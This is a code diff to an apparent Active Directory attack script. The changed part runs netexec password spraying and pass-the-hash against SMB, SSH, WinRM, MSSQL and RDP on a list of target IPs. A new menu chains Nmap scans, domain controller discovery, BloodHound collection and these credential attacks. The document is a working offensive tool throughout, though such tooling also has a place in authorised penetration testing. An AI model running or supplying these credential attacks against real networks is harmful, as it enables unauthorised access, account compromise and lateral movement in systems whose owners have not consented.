@@ -76,22 +76,46 @@ def run_netexec():
     print("[*] Running credential brute-force and pass-the-hash attacks...")
     with open(ip_list_file, "r") as f:
         ips = [line.strip() for line in f]
-
+    
+    services = ["smb", "ssh", "winrm", "mssql", "rdp"]
+    
     for ip in ips:
-        for service, port in ports.items():
-            if port in [22, 445, 5985, 3389, 1433]:  # Targeted services
-                # Password spraying
-                print(f"[*] Performing password spraying on {ip} - {service}...")
-                subprocess.run(f"netexec {service.lower()} {ip} -u {users_file} -p {passwords_file}", shell=True)
-
-                # Pass-the-hash
-                print(f"[*] Testing pass-the-hash on {ip} - {service}...")
-                subprocess.run(f"netexec {service.lower()} {ip} -u {users_file} -H {hashes_file}", shell=True)
+        for service in services:
+            print(f"[*] Attacking {ip} on {service}...")
+            subprocess.run(f"netexec {service} {ip} -u {users_file} -p {passwords_file}", shell=True)
+            subprocess.run(f"netexec {service} {ip} -u {users_file} -H {hashes_file}", shell=True)
 
 if __name__ == "__main__":
-    run_nmap_scan()
-    check_ports()
-    identify_domain_controllers()
-    bloodhound_collect()
-    run_netexec()
-    print("[+] All tasks completed successfully!")
+    while True:
+        print("\nSelect an action:")
+        print("1 - Run Nmap Scan")
+        print("2 - Check Open Ports")
+        print("3 - Identify Domain Controllers")
+        print("4 - Collect BloodHound Data")
+        print("5 - Run NetExec Attacks")
+        print("6 - Run All")
+        print("0 - Exit")
+        
+        choice = input("Enter choice: ")
+        
+        if choice == "1":
+            run_nmap_scan()
+        elif choice == "2":
+            check_ports()
+        elif choice == "3":
+            identify_domain_controllers()
+        elif choice == "4":
+            bloodhound_collect()
+        elif choice == "5":
+            run_netexec()
+        elif choice == "6":
+            run_nmap_scan()
+            check_ports()
+            identify_domain_controllers()
+            bloodhound_collect()
+            run_netexec()
+        elif choice == "0":
+            print("Exiting...")
+            break
+        else:
+            print("Invalid choice. Try again.")
